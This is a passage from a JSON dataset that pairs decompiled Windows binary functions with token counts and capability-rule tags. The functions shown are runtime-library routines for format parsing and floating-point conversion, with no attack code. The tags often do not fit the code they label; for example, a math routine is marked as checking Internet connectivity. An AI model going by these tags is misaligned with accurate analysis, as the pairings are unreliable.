0xffff0020;\n                }\n                return CONCAT44(arg_8h, uVar2);\n            }\n            goto code_r0x00402b8a;\n        }\n        uVar3 = 1;\n    }\ncode_r0x004e1201:\n    if (*0x5755dc == 0) {\n        uVar1 = fcn.0040313e(arg_8h, unaff_retaddr, param_3, param_4);\n        return CONCAT44(arg_8h, uVar1);\n    }\ncode_r0x00402b8a:\n    return CONCAT44(arg_8h, uVar3);\n}\n",
        "token_count": 661
    },
    "004e1e8e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.004e1e8e(double param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_14h;\n    double dVar6;\n    double dVar7;\n    uchar in_XMM0 [16];\n    double dVar8;\n    double dVar9;\n    double dVar10;\n    double dVar11;\n    double dStack12;\n    \n    iVar4 = 0;\n    while( true ) {\n        uVar2 = SUB162(in_XMM0 >> 0x30, 0) >> 4;\n        dVar6 = SUB168(in_XMM0, 0) & *0x561c40 | *0x561cb0;\n        dVar7 = SUB168(in_XMM0, 0) & *0x561c48 | *0x561cb8;\n        uVar1 = SUB82(*0x561c60 + dVar6, 0) & 0x7f0;\n        dVar11 = *0x561c78 & dVar7;\n        dVar9 = (*0x561c70 & dVar6) * *(uVar1 + 0x562260) - *0x561c50;\n        dVar6 = (dVar6 - (*0x561c70 & dVar6)) * *(uVar1 + 0x562260);\n        dVar8 = (dVar7 - dVar11) * *(uVar1 + 0x562268);\n        dVar7 = dVar6 + dVar9;\n        dVar11 = dVar8 + (dVar11 * *(uVar1 + 0x562268) - *0x561c58);\n        uVar3 = uVar2 - 1;\n        if (uVar3 < 0x7fe) {\n            iVar4 = (uVar2 - 0x3ff) + iVar4;\n            dVar10 = iVar4;\n            iVar5 = 0;\n            if (uVar1 + iVar4 * 0x400 == 0) {\n                iVar5 = 0x10;\n            }\n            return ((*0x561d08 * dVar11 + *0x561d18) * dVar11 + *0x561d28) * dVar11 * dVar11 +\n                   ((*0x561d00 * dVar7 + *0x561d10) * dVar7 + *0x561d20) * dVar7 * dVar7 * dVar7 * dVar7 * dVar7 +\n                   *0x561d30 * dVar7 + *(uVar1 + 0x561d88) + dVar10 * *0x561c88 + (dVar8 & *(iVar5 + 0x561c98)) +\n                   *(uVar1 + 0x561d80) + dVar9 + dVar10 * *0x561c80 + (dVar6 & *(iVar5 + 0x561c90));\n        }\n        dStack12 = -(*0x561cc0 == param_1);\n        if (SUB82(dStack12, 0) != 0) break;\n        if (uVar3 != 0xffffffff) {\n            if (uVar3 < 0x7ff) {\n                if (*0x561cb0 == (param_1 & *0x561c40 | *0x561cb0)) {\n                    return *0x561ce8;\n                }\n                arg_14h = 0x3e9;\n                dStack12 = *0x561c40;\n            }\n            else if (((uVar2 & 0x7ff) < 0x7ff) || ((SUB84(param_1, 0) | param_1 >> 0x20 & 0xfffff) == 0)) {\n                dStack12 = -NAN;\n                arg_14h = 9;\n            }\n            else {\n                arg_14h = 0x3e9;\n            }\n            goto code_r0x004e209a;\n        }\n        in_XMM0 = CONCAT88(dVar11, param_1 * *0x561cd0);\n        iVar4 = -0x34;\n    }\n    arg_14h = 8;\n    dStack12 = *0x561ce0;\ncode_r0x004e209a:\n    fcn.0040448f(&param_1, &param_1, &dStack12, arg_14h);\n    return dStack12;\n}\n",
        "token_count": 1011
    },
    "004e2b4e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.004e2b4e(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    unkint10 in_ST0;\n    ulong uStack32;\n    uint16_t uStack24;\n    \n    uStack32._0_4_ = in_ST0;\n    uStack32._4_4_ = in_ST0 >> 0x20;\n    uStack32 = in_ST0;\n    uStack24 = in_ST0 >> 0x40;\n    uStack24 = uStack24 & 0x7fff;\n    if (uStack24 < 0x3fff) {\n        return 0;\n    }\n    if (uStack32._4_4_ < 0) {\n        if (uStack24 < 0x403e) {\n            uVar2 = 0x3e - uStack24;\n            uVar3 = uStack32._4_4_;\n            if (0x1f < uVar2) {\n                uVar3 = 0;\n                uStack32._0_4_ = uStack32._4_4_;\n            }\n            uVar1 = uStack32 >> (uVar2 & 0x1f) | uVar3 << 0x20 - (uVar2 & 0x1f);\n            uVar3 = uVar3 >> (uVar2 & 0x1f);\n            if (in_ST0 < 0) {\n                bVar4 = uVar1 != 0;\n                uVar1 = -uVar1;\n                uVar3 = -(uVar3 + bVar4);\n            }\n            return CONCAT44(uVar3, uVar1);\n        }\n        if (((uStack24 < 0x403f) && ((uStack32._4_4_ * 2 | uStack32) == 0)) && (in_ST0 < 0)) {\n            return uStack32;\n        }\n    }\n    return 0x8000000000000000;\n}\n",
        "token_count": 460
    },
    "00401c80": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00401c80(char *param_1)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    char *var_8h;\n    char *var_4h;\n    \n    if (*(param_1 + 0x1c) != 1) goto code_r0x004a84b4;\n    in_EAX = *(param_1 + 0x10);\n    cVar1 = *in_EAX;\n    if (cVar1 == '%') goto code_r0x004a84b4;\n    iVar2 = *(param_1 + 0x45c);\n    var_4h = param_1;\n    if (iVar2 == 0) {\n        var_4h = NULL;\n        if ((cVar1 < '0') || ('9' < cVar1)) {\n            *(param_1 + 0x45c) = 1;\n            iVar2 = 1;\n            goto code_r0x004a84c2;\n        }\n        var_8h = param_1;\n        in_EAX = fcn.00404999(in_EAX, &var_4h, 10);\n        if ((in_EAX < 1) || (in_EAX = var_4h,  *var_4h != '$')) {\n            *(param_1 + 0x45c) = 1;\n            goto code_r0x004a84b4;\n        }\n        if (*(param_1 + 0x458) == 1) {\n            fcn.00403189(param_1 + 0x464, 0, 0x640);\n        }\n        in_EAX = *(param_1 + 0x10);\n        *(param_1 + 0x45c) = 2;\n    }\n    else {\ncode_r0x004a84c2:\n        if (iVar2 != 2) goto code_r0x004a84b4;\n    }\n    var_8h = NULL;\n    iVar2 = fcn.00404999(in_EAX, &var_8h, 10);\n    pcVar5 = iVar2 + -1;\n    in_EAX = var_8h + 1;\n    *(param_1 + 0xaa8) = pcVar5;\n    *(param_1 + 0x10) = in_EAX;\n    if (*(param_1 + 0x458) == 1) {\n        if (((pcVar5 < 0) || (*var_8h != '$')) || (99 < pcVar5)) {\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            uVar4 = fcn.004037ce();\n            return uVar4 & 0xffffff00;\n        }\n        in_EAX = *(param_1 + 0xaa4);\n        if (pcVar5 <= in_EAX) {\n            pcVar5 = in_EAX;\n        }\n        *(param_1 + 0xaa4) = pcVar5;\n    }\ncode_r0x004a84b4:\n    return in_EAX & 0xffffff00 | 1;\n}\n",
        "token_count": 720
    },
    "00401d6b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.00401d6b(void)\n\n{\n    uint32_t uVar1;\n    float10 in_ST0;\n    uint32_t uStack28;\n    uint16_t uStack24;\n    \n    if (1 < *0x573c4c) {\n        return in_ST0;\n    }\n    uStack28 = in_ST0 >> 0x20;\n    uStack24 = in_ST0 >> 0x40;\n    uStack24 = uStack24 & 0x7fff;\n    uVar1 = in_ST0 < 0;\n    if (uStack24 < 0x3fff) {\n        return 0;\n    }\n    if (uStack28 < 0) {\n        if (uStack24 < 0x401e) {\n            return (uStack28 >> (0x3eU - uStack24 & 0x1f) ^ -uVar1) + uVar1;\n        }\n        if (((uStack24 < 0x401f) && (uVar1 != 0)) && (uStack28 == 0x80000000)) {\n            return uStack28;\n        }\n    }\n    return 0x80000000;\n}\n",
        "token_count": 263
    },
    "00402153": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00402153(int32_t param_1)\n\n{\n    uint32_t in_EAX;\n    \n    if ((*(param_1 + 0x45c) != 2) || (in_EAX = 1,  *(param_1 + 0x458) != 1)) {\n        in_EAX = in_EAX & 0xffffff00;\n    }\n    return in_EAX;\n}\n",
        "token_count": 95
    },
    "0040263a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040263a(int32_t param_1)\n\n{\n    uint32_t in_EAX;\n    \n    if ((*(param_1 + 0x45c) != 2) || (in_EAX = 1,  *(param_1 + 0x458) != 1)) {\n        in_EAX = in_EAX & 0xffffff00;\n    }\n    return in_EAX;\n}\n",
        "token_count": 96
    },
    "00402b03": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00402b03(uint16_t *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint16_t *puVar5;\n    uint16_t *var_8h;\n    uint16_t *var_4h;\n    \n    if (*(param_1 + 0xe) != 1) goto code_r0x004a8867;\n    in_EAX = *(param_1 + 8);\n    uVar1 = *in_EAX;\n    if (uVar1 == 0x25) goto code_r0x004a8867;\n    iVar2 = *(param_1 + 0x22e);\n    var_4h = param_1;\n    if (iVar2 == 0) {\n        var_4h = NULL;\n        if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n            *(param_1 + 0x22e) = 1;\n            iVar2 = 1;\n            goto code_r0x004a8876;\n        }\n        var_8h = param_1;\n        in_EAX = fcn.00403675(in_EAX, &var_4h, 10);\n        if ((in_EAX < 1) || (in_EAX = var_4h,  *var_4h != 0x24)) {\n            *(param_1 + 0x22e) = 1;\n            goto code_r0x004a8867;\n        }\n        if (*(param_1 + 0x22c) == 1) {\n            fcn.00403189(param_1 + 0x232, 0, 0x640);\n        }\n        in_EAX = *(param_1 + 8);\n        *(param_1 + 0x22e) = 2;\n    }\n    else {\ncode_r0x004a8876:\n        if (iVar2 != 2) goto code_r0x004a8867;\n    }\n    var_8h = NULL;\n    iVar2 = fcn.00403675(in_EAX, &var_8h, 10);\n    puVar5 = iVar2 + -1;\n    in_EAX = var_8h + 1;\n    *(param_1 + 0x554) = puVar5;\n    *(param_1 + 8) = in_EAX;\n    if (*(param_1 + 0x22c) == 1) {\n        if (((puVar5 < 0) || (*var_8h != 0x24)) || (99 < puVar5)) {\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            uVar4 = fcn.004037ce();\n            return uVar4 & 0xffffff00;\n        }\n        in_EAX = *(param_1 + 0x552);\n        if (puVar5 <= in_EAX) {\n            puVar5 = in_EAX;\n        }\n        *(param_1 + 0x552) = puVar5;\n    }\ncode_r0x004a8867:\n    return in_EAX & 0xffffff00 | 1;\n}\n",
        "token_count": 731
    },
    "00402bf3": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00402bf3(uint noname_0, uint noname_1, int32_t arg_10h)\n\n{\n    uint arg_8h;\n    int32_t iVar1;\n    float10 fVar2;\n    ushort uVar3;\n    uint16_t uVar4;\n    uint uVar5;\n    double dVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    double dStack16;\n    int32_t var_4h;\n    \n    arg_8h = fcn.0040524f(0x133f, 0xffff);\n    uVar4 = noname_1 >> 0x10;\n    uVar3 = noname_1;\n    dVar6 = CONCAT26(uVar4, CONCAT24(uVar3, noname_0));\n    uVar7 = dVar6 >> 0x20;\n    if ((uVar4 & 0x7ff0) == 0x7ff0) {\n        iVar1 = fcn.00405268(noname_0, uVar7);\n        if (0 < iVar1) {\n            if (iVar1 < 3) goto code_r0x004b4075;\n            if (iVar1 == 3) {\n                fVar2 = fcn.00405a51(noname_0, CONCAT26(uVar4, CONCAT24(uVar3, noname_0)) >> 0x20, SUB84(arg_10h, 0));\n                fcn.0040524f(arg_8h, 0xffff);\n                goto code_r0x004b4034;\n            }\n        }\n        dVar6 = CONCAT26(uVar4, CONCAT24(uVar3, noname_0));\n        uVar9 = SUB84(*0x555f70 + dVar6, 0);\n        uVar10 = *0x555f70 + dVar6 >> 0x20;\n        uVar7 = SUB84(arg_10h, 0);\n        uVar8 = arg_10h >> 0x20;\n        uVar5 = 8;\n        goto code_r0x004b41a7;\n    }\n    if (dVar6 == 0.0) {\ncode_r0x004b4075:\n        fcn.0040524f(arg_8h, 0xffff);\n        return CONCAT26(uVar4, CONCAT24(uVar3, noname_0));\n    }\n    fVar2 = fcn.00403a8f(noname_0, uVar7, &var_4h);\n    if (arg_10h < 0) {\n        if (var_4h < -0x80000000 - arg_10h) {\ncode_r0x004b4106:\n            uVar9 = SUB84(0 * fVar2, 0);\n            uVar10 = 0 * fVar2 >> 0x20;\ncode_r0x004b411b:\n            uVar7 = SUB84(arg_10h, 0);\n            uVar8 = arg_10h >> 0x20;\n            dVar6 = CONCAT26(uVar4, CONCAT24(uVar3, noname_0));\n            uVar5 = 0x12;\n            goto code_r0x004b41a7;\n        }\ncode_r0x004b40bd:\n        var_4h = var_4h + arg_10h;\n        if (0xa00 < var_4h) goto code_r0x004b4175;\n        if (var_4h < 0x401) {\n            if (var_4h < -0x9fd) goto code_r0x004b4106;\n            if (-0x3fe < var_4h) {\n                fVar2 = fcn.004052e0(SUB84(fVar2, 0), fVar2 >> 0x20, var_4h);\n                fcn.0040524f(arg_8h, 0xffff);\ncode_r0x004b4034:\n                dStack16 = fVar2;\n                return dStack16;\n            }\n            fVar2 = fcn.004052e0(SUB84(fVar2, 0), fVar2 >> 0x20, var_4h + 0x600);\n            uVar9 = SUB84(fVar2, 0);\n            uVar10 = fVar2 >> 0x20;\n            goto code_r0x004b411b;\n        }\n        fVar2 = fcn.004052e0(SUB84(fVar2, 0), fVar2 >> 0x20, var_4h + -0x600);\n        uVar9 = SUB84(fVar2, 0);\n        uVar10 = fVar2 >> 0x20;\n        uVar7 = SUB84(arg_10h, 0);\n        uVar8 = arg_10h >> 0x20;\n    }\n    else {\n        if (var_4h <= 0x7fffffff - arg_10h) goto code_r0x004b40bd;\ncode_r0x004b4175:\n        fVar2 = fcn.004046a6(*0x558930, *0x558930 >> 0x20, SUB84(fVar2, 0), fVar2 >> 0x20);\n        uVar9 = SUB84(fVar2, 0);\n        uVar10 = fVar2 >> 0x20;\n        uVar7 = SUB84(arg_10h, 0);\n        uVar8 = arg_10h >> 0x20;\n    }\n    dVar6 = CONCAT26(uVar4, CONCAT24(uVar3, noname_0));\n    uVar5 = 0x11;\ncode_r0x004b41a7:\n    fVar2 = fcn.00406753(uVar5, 0x19, dVar6, uVar7, uVar8, uVar9, uVar10, arg_8h);\n    return fVar2;\n}\n",
        "token_count": 1334
    },
    "00402ee1": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402ee1(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    \n    if (-1 < arg_8h) {\n        if (arg_8h < 3) {\n            uVar1 = *0x5755d4;\n            *0x5755d4 = arg_8h;\n            return uVar1;\n        }\n        if (arg_8h == 3) {\n            return *0x5755d4;\n        }\n    }\n    puVar2 = fcn.00403a35();\n    *puVar2 = 0x16;\n    fcn.004037ce();\n    return 0xffffffff;\n}\n",
        "token_count": 157
    },
    "00403012": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403012(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.00402d83();\n    if (cVar2 != '\\0') {\n        if (*(param_1 + 0x10) != 0) {\ncode_r0x0049db12:\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049dafb:\n                iVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x32) = iVar1;\n                if (iVar1 != 0) {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049db12;\n                    uVar4 = fcn.00403436(*(param_1 + 0x32), *(param_1 + 0x1c));\n                    *(param_1 + 0x1c) = uVar4;\n    // switch table (8 cases) at 0x49db30\n                    switch(uVar4) {\n                    case 0:\n                        cVar2 = fcn.00403d0f();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049dafb;\n                    case 2:\n                        cVar2 = fcn.00405952();\n                        break;\n                    case 3:\n                        cVar2 = fcn.00401244();\n                        break;\n                    case 4:\n                        goto code_r0x0049dad5;\n                    case 5:\n                        cVar2 = fcn.00401ee7();\n                        break;\n                    case 6:\n                        cVar2 = fcn.00402013();\n                        break;\n                    case 7:\n                        cVar2 = fcn.004026fd();\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049da67;\n                    default:\n                        goto code_r0x0049da54;\n                    }\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049dafb;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n            } while( true );\n        }\ncode_r0x0049da54:\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        fcn.004037ce();\n    }\ncode_r0x0049da67:\n    return 0xffffffff;\ncode_r0x0049dad5:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049dafb;\n}\n",
        "token_count": 804
    },
    "00403076": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __thiscall\nfcn.00403076(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uint arg_ch;\n    char cVar1;\n    uint *puVar2;\n    uint32_t arg_8h;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_retaddr;\n    \n    cVar1 = fcn.00403d28();\n    if (cVar1 != '\\0') {\n        if (*(param_1 + 0x10) != 0) {\ncode_r0x0049ce29:\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049ce16:\n                cVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x31) = cVar1;\n                if (cVar1 != '\\0') {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049ce29;\n                    arg_ch = *(param_1 + 0x1c);\n                    arg_8h = *(param_1 + 0x31);\n                    uVar3 = fcn.00401f46(arg_8h, arg_ch);\n                    *(param_1 + 0x1c) = uVar3;\n    // switch table (8 cases) at 0x49ce44\n                    switch(uVar3) {\n                    case 0:\n                        cVar1 = fcn.0040565a();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049ce16;\n                    case 2:\n                        cVar1 = fcn.004052b3();\n                        break;\n                    case 3:\n                        cVar1 = fcn.00402c5c();\n                        break;\n                    case 4:\n                        goto code_r0x0049cdf0;\n                    case 5:\n                        cVar1 = fcn.00401ac3();\n                        break;\n                    case 6:\n                        cVar1 = fcn.00402a90();\n                        break;\n                    case 7:\n                        cVar1 = fcn.004028fb(arg_8h, arg_ch, arg_8h, unaff_EBX, unaff_retaddr, param_2, param_3, param_4\n                                             , param_5, param_6, param_7);\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049cd83;\n                    default:\n                        goto code_r0x0049cd70;\n                    }\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049ce16;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n            } while( true );\n        }\ncode_r0x0049cd70:\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n    }\ncode_r0x0049cd83:\n    return 0xffffffff;\ncode_r0x0049cdf0:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049ce16;\n}\n",
        "token_count": 929
    },
    "004030cb": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004030cb(int32_t param_1)\n\n{\n    uint32_t in_EAX;\n    \n    if ((*(param_1 + 0x45c) != 2) || (in_EAX = 1,  *(param_1 + 0x458) != 1)) {\n        in_EAX = in_EAX & 0xffffff00;\n    }\n    return in_EAX;\n}\n",
        "token_count": 95
    },
    "0040317f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040317f(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.00405a15();\n    if (cVar2 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049d30b:\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            fcn.004037ce();\n        }\n        else {\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049d3b2:\n                iVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x32) = iVar1;\n                if (iVar1 != 0) {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049d3c9;\n                    uVar4 = fcn.004060b9(*(param_1 + 0x32), *(param_1 + 0x1c));\n                    *(param_1 + 0x1c) = uVar4;\n    // switch table (8 cases) at 0x49d3f3\n                    switch(uVar4) {\n                    case 0:\n                        cVar2 = fcn.004052d1();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049d3b2;\n                    case 2:\n                        cVar2 = fcn.004029a0();\n                        break;\n                    case 3:\n                        cVar2 = fcn.00406104();\n                        break;\n                    case 4:\n                        goto code_r0x0049d38c;\n                    case 5:\n                        cVar2 = fcn.00402a86();\n                        break;\n                    case 6:\n                        cVar2 = fcn.00403c47();\n                        break;\n                    case 7:\n                        cVar2 = fcn.00401af0();\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049d31e;\n                    default:\n                        goto code_r0x0049d30b;\n                    }\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049d3b2;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\ncode_r0x0049d3c9:\n                cVar2 = fcn.00402199();\n            } while (cVar2 != '\\0');\n        }\n    }\ncode_r0x0049d31e:\n    return 0xffffffff;\ncode_r0x0049d38c:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049d3b2;\n}\n",
        "token_count": 850
    },
    "004035d0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004035d0(int32_t param_1)\n\n{\n    uint32_t in_EAX;\n    \n    if ((*(param_1 + 0x45c) != 2) || (in_EAX = 1,  *(param_1 + 0x458) != 1)) {\n        in_EAX = in_EAX & 0xffffff00;\n    }\n    return in_EAX;\n}\n",
        "token_count": 96
    },
    "004038f5": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __thiscall\nfcn.004038f5(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uint arg_ch;\n    char cVar1;\n    uint *puVar2;\n    uint32_t arg_8h;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_retaddr;\n    \n    cVar1 = fcn.004054b6();\n    if (cVar1 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049cec9:\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n        }\n        else {\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049cf6f:\n                cVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x31) = cVar1;\n                if (cVar1 != '\\0') {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049cf82;\n                    arg_ch = *(param_1 + 0x1c);\n                    arg_8h = *(param_1 + 0x31);\n                    uVar3 = fcn.004016fe(arg_8h, arg_ch);\n                    *(param_1 + 0x1c) = uVar3;\n    // switch table (8 cases) at 0x49cfad\n                    switch(uVar3) {\n                    case 0:\n                        cVar1 = fcn.00401406();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049cf6f;\n                    case 2:\n                        cVar1 = fcn.00403175();\n                        break;\n                    case 3:\n                        cVar1 = fcn.0040105f();\n                        break;\n                    case 4:\n                        goto code_r0x0049cf49;\n                    case 5:\n                        cVar1 = fcn.004036cf();\n                        break;\n                    case 6:\n                        cVar1 = fcn.00403346();\n                        break;\n                    case 7:\n                        cVar1 = fcn.00406447(arg_8h, arg_ch, arg_8h, unaff_EBX, unaff_retaddr, param_2, param_3, param_4\n                                             , param_5, param_6, param_7);\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049cedc;\n                    default:\n                        goto code_r0x0049cec9;\n                    }\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049cf6f;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\ncode_r0x0049cf82:\n                cVar1 = fcn.0040428c();\n            } while (cVar1 != '\\0');\n        }\n    }\ncode_r0x0049cedc:\n    return 